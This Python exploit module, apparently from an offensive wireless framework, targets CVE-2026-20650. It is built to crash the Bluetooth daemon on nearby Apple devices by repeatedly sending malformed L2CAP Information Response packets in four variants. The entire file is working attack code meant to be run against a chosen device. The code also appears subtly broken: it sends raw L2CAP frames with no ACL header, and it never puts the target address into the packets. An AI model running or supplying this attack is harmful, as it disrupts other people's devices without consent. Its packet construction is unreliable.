# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Apple Bluetooth Denial of Service (CVE-2026-20650).

    Apple devices (iOS, macOS, iPadOS) contain a vulnerability in
    the Bluetooth stack where processing malformed L2CAP signaling
    packets triggers an assertion failure in the Bluetooth daemon.
    The assertion is hit when an L2CAP Information Response contains
    an unexpected info type with a result indicating success but
    zero-length data.  A remote attacker within Bluetooth range
    can crash the Bluetooth subsystem repeatedly, causing persistent
    denial of service until the user manually restarts Bluetooth or
    reboots the device.

    Apple Security Advisory: HT214201

    CVSS v3.1: 6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Apple Bluetooth Stack Denial of Service (CVE-2026-20650)",
        "description": (
            "Exploits CVE-2026-20650 to crash the Bluetooth daemon on "
            "Apple devices.  Sends malformed L2CAP Information Response "
            "packets with unexpected info types and zero-length data "
            "that trigger an assertion failure in Apple's BT stack.  "
            "The crash is persistent until Bluetooth is manually "
            "restarted or the device is rebooted."
        ),
        "authors": (
            "Apple Security (advisory HT214201)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20650",
            "https://support.apple.com/en-us/HT214201",
        ),
        "disclosure_date": "2026-06-15",
        "platform": "apple",
        "arch": "arm64",
        "privileged": False,
        "targets": (
            "iOS < 18.3",
            "macOS < 15.3",
            "iPadOS < 18.3",
        ),
    }

    target = OptIP("", "Target Bluetooth address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (Bluetooth over-the-air)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    interface = OptString("hci0", "Local HCI adapter")
    crash_attempts = OptInteger(16, "Number of crash trigger attempts")

    _AF_BLUETOOTH = 31
    _BTPROTO_HCI = 1
    _BTPROTO_L2CAP = 0

    _L2CAP_CID_SIGNALING = 0x0001
    _L2CAP_INFO_RSP = 0x0B
    _L2CAP_INFO_REQ = 0x0A

    _L2CAP_IT_CL_MTU = 0x0001
    _L2CAP_IT_FEAT_MASK = 0x0002
    _L2CAP_IT_FIXED_CHAN = 0x0003

    _L2CAP_IR_SUCCESS = 0x0000
    _L2CAP_IR_NOTSUPP = 0x0001

    def _bd_addr_to_bytes(self, addr: str) -> bytes:
        parts = addr.split(":")
        return bytes(int(b, 16) for b in reversed(parts))

    def _build_l2cap_info_response(self, identifier: int,
                                    info_type: int,
                                    result: int,
                                    data: bytes = b"") -> bytes:
        """Build an L2CAP Information Response.

        The crash triggers when info_type is unexpected (e.g. 0xFF00)
        with result=SUCCESS but zero-length data, causing an assertion
        in Apple's BT stack when it tries to parse the response data.
        """
        payload = struct.pack("<HH", info_type, result) + data

        sig_header = struct.pack("<BBH", self._L2CAP_INFO_RSP,
                                 identifier, len(payload))

        l2cap_header = struct.pack("<HH",
                                    len(sig_header + payload),
                                    self._L2CAP_CID_SIGNALING)

        return l2cap_header + sig_header + payload

    def _open_hci_socket(self) -> socket.socket | None:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            return sock
        except OSError:
            return None

    def _hci_send(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(self._AF_BLUETOOTH, socket.SOCK_RAW,
                                 self._BTPROTO_HCI)
            sock.settimeout(self.timeout)
            dev_id = int(str(self.interface).replace("hci", "")) if str(
                self.interface).startswith("hci") else 0
            sock.bind((dev_id,))
            sock.send(packet)
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        sock = self._open_hci_socket()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth address XX:XX:XX:XX:XX:XX)")
            return

        if not self.check():
            print_error(
                f"HCI adapter {self.interface} not available or "
                "insufficient privileges"
            )
            return

        print_success(
            f"HCI adapter {self.interface} available; targeting {self.target} "
            "with Apple BT DoS trigger"
        )
        self._exploit()

    def _exploit(self) -> None:
        crash_payloads = [
            (0xFF00, self._L2CAP_IR_SUCCESS, b""),
            (0x0000, self._L2CAP_IR_SUCCESS, b""),
            (0xFFFF, self._L2CAP_IR_SUCCESS, b""),
            (self._L2CAP_IT_FEAT_MASK, self._L2CAP_IR_SUCCESS, b""),
        ]

        print_status(
            f"Sending {self.crash_attempts} malformed L2CAP Info Response "
            f"packets ({len(crash_payloads)} variants)"
        )

        success = 0
        for attempt in range(self.crash_attempts):
            info_type, result, data = crash_payloads[
                attempt % len(crash_payloads)
            ]
            identifier = (attempt % 255) + 1

            pkt = self._build_l2cap_info_response(
                identifier, info_type, result, data
            )

            if self._hci_send(pkt):
                success += 1
            time.sleep(0.1)

        print_status(f"Sent {success}/{self.crash_attempts} crash trigger packets")
        print_info(
            "If the target is an Apple device running a vulnerable BT stack, "
            "the malformed L2CAP Information Responses with unexpected info "
            "types and zero-length data should trigger an assertion failure "
            "in the Bluetooth daemon.  The crash is persistent until "
            "Bluetooth is manually toggled or the device reboots."
        )
